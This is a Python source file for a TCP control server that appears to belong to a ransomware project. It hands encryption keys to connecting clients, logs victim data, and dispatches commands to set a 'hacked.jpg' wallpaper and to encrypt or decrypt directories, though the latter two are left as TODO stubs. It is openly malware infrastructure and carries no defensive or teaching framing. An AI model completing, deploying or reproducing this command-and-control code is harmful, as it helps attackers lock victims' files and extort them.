import socket
import threading
import json
import logging
from colorama import init, Fore, Style
import base64
import os
import subprocess

init(autoreset=True)


class ControlServer:
    def __init__(self, host, port, log_file):
        self.host = host
        self.port = port
        self.server = None
        self.setup_logging(log_file)

    def setup_logging(self, log_file):
        logging.basicConfig(filename=log_file, level=logging.INFO,
                            format='%(asctime)s - %(levelname)s - %(message)s')

    def handle_client(self, connection, address):
        buffer = b""  # Initialize an empty byte string for the buffer
        while True:
            data = connection.recv(1024)
            if not data:
                # No more data is being sent, break the loop
                break
            buffer += data

        try:
            message = json.loads(buffer.decode())
            if 'request' in message and message['request'] == 'key':
                print(f"Key request received from: {address}")
                key = input(f"{Fore.RED}Please enter the encryption key: {Style.RESET_ALL}")
                response = json.dumps({'key': key})
                connection.sendall(response.encode())
                logging.info(key)
            else:
                logging.info(f"Data received from {address}: {message}")
                print(f"{Fore.GREEN}Data received: {address}. {message}{Style.RESET_ALL}")

            match message['cmd']:
                case 'bg':
                    print(f"Background change request received from {address}")
                    image_path = "hacked.jpg"

                    # Command to change the desktop background
                    # doesn't work
                    try:
                        subprocess.run(["xfconf-query", "-c", "xfce4-desktop", "-p",
                                        "/backdrop/screen0/monitorVirtual-1/workspace0/last-image", "-s", image_path],
                                       check=True)
                        print('result:Background changed successfully.')
                    except subprocess.CalledProcessError as e:
                        response = json.dumps({'error': 'Failed to change background.'})
                case 'encrypt':
                    print (f"Encrypt selected directory")
                    # TODO copy from encoder.py
                case 'decrypt':
                    print (f"decrypt selected directory")
                    # TODO copy from Decoder.py

        except json.JSONDecodeError:
            logging.error("Invalid JSON data received.")
        finally:
            connection.close()

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))
        self.server.listen(5)
        logging.info(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}.{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Server listening at {self.host}:{self.port}{Style.RESET_ALL}")

        try:
            while True:
                connection, address = self.server.accept()
                logging.info(f"Connection established from {address}.")
                print(f"Connection established from {address}")
                client_thread = threading.Thread(target=self.handle_client, args=(connection, address))
                client_thread.start()
        except KeyboardInterrupt:
            logging.info("Shutting down the server.")
            print("Server shut down")
        finally:
            self.server.close()


if __name__ == "__main__":
    HOST = '0.0.0.0'  # Listen on all interfaces
    PORT = 12345  # Port number
    LOG_FILE = 'server_log.txt'  # Name of the log file

    control_server = ControlServer(HOST, PORT, LOG_FILE)
    control_server.start()
